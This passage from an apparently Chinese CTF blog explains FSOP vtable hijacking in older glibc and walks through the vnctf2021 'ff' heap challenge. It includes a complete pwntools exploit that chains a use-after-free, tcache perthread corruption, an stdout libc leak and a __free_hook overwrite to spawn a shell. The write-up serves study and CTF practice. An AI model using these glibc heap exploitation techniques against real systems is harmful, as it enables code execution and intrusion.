<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f754337997d</span>+<span class="number">3</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f7543379980</span> (_IO_2_1_stdin_+<span class="number">160</span>) —▸ <span class="number">0x7f75433799c0</span> (_IO_wide_data_0) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f7543379988</span> (_IO_2_1_stdin_+<span class="number">168</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f75433799a0</span> (_IO_2_1_stdin_+<span class="number">192</span>) ◂— <span class="number">0xffffffff</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f75433799a8</span> (_IO_2_1_stdin_+<span class="number">200</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f75433799b0</span> (_IO_2_1_stdin_+<span class="number">208</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f75433799b8</span> (_IO_2_1_stdin_+<span class="number">216</span>) —▸ <span class="number">0x562989a57010</span> ◂— <span class="number">0x0</span> <span class="comment">// 成功修改</span></span><br></pre></td></tr></table></figure>
<p>​        // 本文是基于 libc-2.23 及之前的libc上可实施的，libc-2.24 之后加入了 vtable check 机制，无法再构造vtable</p>
<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>FSOP（ File Stream Oriented Programming ），是一种劫持 <code>_IO_list_all</code> 来伪造文件流对象链表的利用技术，常与 house of orange 连用，通过调用 <code>_IO_flush_all_lockp</code> 函数触发</p>
<p>该函数会在下面三种情况下被调用：</p>
<ul>
<li>第一，libc 检测到内存错误从而执行 abort 流程时</li>
<li>第二，执行 exit 函数时</li>
<li>第三，main 函数返回时</li>
</ul>
<p>先分析 <code>_IO_flush_all_lockp</code> 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_flush_all_lockp ()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">    <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	 || (fp-&gt;_vtable_offset == <span class="number">0</span></span><br><span class="line">	     &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				  &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	 )</span><br><span class="line">	&amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">      result = EOF;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在执行 <code>_IO_OVERFLOW</code> 前有两个检查：（通常是采用这个伪造）</p>
<ul>
<li><code>_mode</code> &gt;= 0  </li>
<li><code>_IO_write_base</code> &lt; <code>_IO_write_ptr</code></li>
</ul>
<p>而对 <code>_IO_OVERFLOW</code> 的调用是 <strong>虚表调用</strong> ，是可以进行劫持的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*(struct _IO_jump_t*)_IO_list_all.vtable</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0</span>,</span><br><span class="line">  __finish = <span class="number">0x7ffff7e68510</span> &lt;_IO_new_file_finish&gt;,</span><br><span class="line">  __overflow = <span class="number">0x7ffff7e69320</span> &lt;_IO_new_file_overflow&gt;, <span class="comment">// target</span></span><br><span class="line">  __underflow = <span class="number">0x7ffff7e68fc0</span> &lt;_IO_new_file_underflow&gt;,</span><br><span class="line">    ................</span><br><span class="line">  __showmanyc = <span class="number">0x7ffff7a89b00</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class="line">  __imbue = <span class="number">0x7ffff7a89b10</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;        </span><br></pre></td></tr></table></figure>
<p>可见第4片区域就是 <code>__overflow</code> 的虚表，我们可以劫持该虚表为“one_gadget”或者其他需要的函数</p>
<p><strong>利用姿势</strong></p>
<p>一般在pwn题中，我们都是构造内存错误，此时会产生一系列的函数调用路径，最终的调用为：<code>_IO_flush_all_lockp</code> —&gt; <code>_IO_OVERFLOW</code>，而这里的 <code>_IO_OVERFLOW</code> 就是文件流对象虚表的第四项指向的内容 <code>_IO_new_file_overflow</code> </p>
<p>因此我们的利用思路一般是：</p>
<ul>
<li>要么直接修改文件流对象</li>
<li>要么伪造一个_IO_FILE结构体</li>
</ul>
<p><strong>版本影响</strong></p>
<p>libc-2.24：多了 vtable check，这就意味着我们不能利用任意地址来充当<code>vtable</code> </p>
<p>libc-2.27：完全失效</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/15/IO_2_1_stdout%20leak+Tcache%20attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/15/IO_2_1_stdout%20leak+Tcache%20attack/" class="post-title-link" itemprop="url">IO_2_1_stdout leak+Tcache attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-15 23:36:21" itemprop="dateCreated datePublished" datetime="2022-03-15T23:36:21+08:00">2022-03-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-03-17 13:56:52" itemprop="dateModified" datetime="2022-03-17T13:56:52+08:00">2022-03-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>vnctf2021 ff 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./pwn </span><br><span class="line"><span class="number">1.</span>add</span><br><span class="line"><span class="number">2.</span>del</span><br><span class="line"><span class="number">3.</span><span class="built_in">exit</span></span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">1f</span>d4ed1f1e5db9e2f81e26150d0a5b6db56d2261, <span class="keyword">not</span> stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/ywhkkx/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<p>程序给了 libc 版本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.32</span><span class="number">-0u</span>buntu3)</span> release release versio</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)chunk_list[idx]);                <span class="comment">// UAF</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经典 UAF </p>
<p><strong>入侵思路</strong></p>
<p>程序可以控制的部分太少了，连 free 的参数都不能控制，另外程序是有“打印模块”和“修改模块”的，但是“修改模块”只能使用两次，每次只能改16字节，还没法控制参数，“打印模块”也被法控制，并且只能打印一次</p>
<p>因为只能打印一次，“libc_base”，“chunk_list_addr”，“heap_addr”这些我们想要的数据就只能 leak 一个，我当然是想要 “libc_base” ，但是程序又有限制</p>
<p>因为程序限制 malloc size 的大小，所以 unsortedbin leak 挂了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">size = myRead();</span><br><span class="line"><span class="keyword">if</span> ( size &gt; <span class="number">0x7E</span> )</span><br><span class="line">  size = <span class="number">127</span>;                                 <span class="comment">// 大小限制</span></span><br></pre></td></tr></table></figure>
<p>只能泄露“heap_addr”了，在加上“打印模块”的长度不够，所以还需要一些操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">delete</span>()</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;1&#x27;</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_addr=eval(hex(leak_addr)+<span class="string">&#x27;0&#x27;</span>*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;heap_addr &gt;&gt; &#x27;</span>+hex(heap_addr))</span><br></pre></td></tr></table></figure>
<p>只知道“heap_addr”，我的第一反应是打 unlink，但是没有 off-by-one 也打不了，我觉得我止步于此了，但我还是想谈一谈我的想法：</p>
<p>这题没有泄露“libc_base”，大概率是要打 house of roman 爆破libc库函数的，关键就在于这个 size 检查把 unsortedbin 限制了，导致 main_arene 写不进来，当然 house of roman 也没毛用了</p>
<p>没有“libc_base”还有一个解决方式，IO_2_1_stdout leak，这种攻击可以和 house of roman 结合（比如我刚刚复现过的 nepctf2021 sooooeasy），但缺少 main_arene 的核心问题还是没有解决</p>
<p>先挂上大佬的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process([file_path])</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.32.so&#x27;</span>)</span><br><span class="line">elf=ELF(file_path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content=<span class="string">b&quot;1\n&quot;</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">stdout = <span class="number">0xa6c0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add(<span class="number">0x78</span>)</span><br><span class="line">        delete()</span><br><span class="line">        show()</span><br><span class="line">        heap_base = u64(p.recv(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">        log.success(<span class="string">&quot;heap base is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">        edit(<span class="string">b&quot;\x00&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">        delete()</span><br><span class="line">        enc = ((heap_base + <span class="number">0x2a0</span>) &gt;&gt; <span class="number">12</span>) ^ (heap_base + <span class="number">0x10</span>)</span><br><span class="line">        edit(p64(enc) + p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x78</span>)</span><br><span class="line">        add(<span class="number">0x78</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0x0007000000000000</span>))</span><br><span class="line">        delete()</span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x48</span>, p32(<span class="number">0</span>) + p16(<span class="number">2</span>) + p16(<span class="number">0</span>) + p16(<span class="number">1</span>) + p16(<span class="number">0</span>) + p32(<span class="number">0</span>) + <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x38</span>)</span><br><span class="line">        add(<span class="number">0x48</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x40</span> + p64(heap_base + <span class="number">0xb0</span>))</span><br><span class="line">        delete()</span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x38</span>, p16(stdout))</span><br><span class="line">        add(<span class="number">0x58</span>, p64(<span class="number">0xfdad2887</span> | <span class="number">0x1000</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">        libc.address = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x84</span> - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">        log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">        <span class="keyword">if</span>(libc.address&gt;<span class="number">0x5000000000000</span> <span class="keyword">or</span> libc.address &lt; <span class="number">0x5000</span>):</span><br><span class="line">        	<span class="built_in">print</span>(<span class="string">&quot;wrong and continue\n&quot;</span>)</span><br><span class="line">        	<span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        p = process([file_path])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x40</span> + p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x10</span>) + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>经过测试，大佬的 exp 也不是百分之百可以打通的，因为有时候会 leak 异常的 libc_base，所以我修改了一下 exp ，使其可以舍弃掉一些异常的 libc_base</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">heap_base = u64(p.recv(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span> <span class="comment"># 16进制下填3个0，2进制下填3*4个0</span></span><br><span class="line">log.success(<span class="string">&quot;heap base is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br></pre></td></tr></table></figure>
<p>大佬的 heap_addr 泄露和我的思路一样，但是比我的简洁多了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="string">b&quot;\x00&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete() <span class="comment"># 释放&gt;&gt;修改FD&gt;&gt;释放(tcache dup，类似于Double free)</span></span><br><span class="line">enc = ((heap_base + <span class="number">0x2a0</span>) &gt;&gt; <span class="number">12</span>) ^ (heap_base + <span class="number">0x10</span>)</span><br><span class="line">edit(p64(enc) + p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0x0007000000000000</span>))</span><br><span class="line"><span class="comment"># 利用tcache dup申请tcache_perthread_struct </span></span><br><span class="line">delete()</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x558b1cfcd000</span></span><br><span class="line"><span class="number">0x558b1cfcd000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000291</span></span><br><span class="line"><span class="number">0x558b1cfcd010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0007000000000000</span> <span class="comment">// 修改count为&#x27;7&#x27;</span></span><br><span class="line"><span class="number">0x558b1cfcd060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>delete() 执行之后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x558b1cfcd000</span> —▸ <span class="number">0x7fea097ddc00</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x558b1cfcd000</span></span><br></pre></td></tr></table></figure>
<p>大佬果然有办法搞到“main_arena”，这里其实是利用了 tcache 的机制：</p>
<ul>
<li>当某一个tcache链表满了7个，再有对应的chunk（不属于fastbin的）被free，就直接进入了unsortedbin中</li>
<li>tcache_perthread_struct 结构一般在 heapbase+0x10（0x8）的位置，对应tcache的数目是char类型</li>
</ul>
<p>因为程序没法控制“释放模块”的参数，所以想通过正常手段填满 tache 显然不可能了，但是我们已知 heapbase 的地址，可以通过 tcache dup 来劫持 tcache_perthread_struct，将<code>0x290</code>大小堆块对应的<code>count</code>设置为<code>7</code>，释放后就会把整个 tcache_perthread_struct 放入 unsortedbin（这种攻击模式被称为 tcache perthread corruption）</p>
<p>注意：因为 libc-2.32 新增加的特性：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>
<p>程序会对 <code>tcache-&gt;fd</code> 指针的加密（还有这种操作？），所以我们在伪造 FD 的时候也要进行一次相同的加密</p>
<p>接下来申请了两个 chunk 把“heap_base + 0xb0”连接入“tcachebin”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x48</span>, p32(<span class="number">0</span>) + p16(<span class="number">2</span>) + p16(<span class="number">0</span>) + p16(<span class="number">1</span>) + p16(<span class="number">0</span>) + p32(<span class="number">0</span>) + <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x48</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x40</span> + p64(heap_base + <span class="number">0xb0</span>)) <span class="comment"># heap_base+0xb0 to tache</span></span><br><span class="line">delete()</span><br></pre></td></tr></table></figure>
<p>释放后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x558b1cfcd000</span></span><br><span class="line"><span class="number">0x558b1cfcd000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// add</span></span><br><span class="line"><span class="number">0x558b1cfcd010</span>:	<span class="number">0x0001000200000000</span>	<span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x558b1cfcd020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// add</span></span><br><span class="line"><span class="number">0x558b1cfcd060</span>:	<span class="number">0x0000000558b1ce3c</span>	<span class="number">0x0000558b1cfcd010</span> <span class="comment">// delete</span></span><br><span class="line"><span class="number">0x558b1cfcd070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd0a0</span>:	<span class="number">0x0000558b1cfcd0b0</span>	<span class="number">0x0000558b1cfcd060</span> <span class="comment">// &#x27;0x40&#x27;的tcache</span></span><br><span class="line">    		<span class="comment">/* 伪造&#x27;0x40&#x27;的tcache(带有main_arena) */</span> </span><br><span class="line"><span class="number">0x558b1cfcd0b0</span>:	<span class="number">0x00007fea097ddc00</span>	<span class="number">0x00007fea097ddc00</span> <span class="comment">// &#x27;0x60&#x27;的tcache</span></span><br><span class="line">    		<span class="comment">/* 这里曾经是unsortedbin,所以main_arena留下来了 */</span></span><br><span class="line"><span class="number">0x558b1cfcd0c0</span>:	<span class="number">0x0000000558b1cfcd</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd0d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd0e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
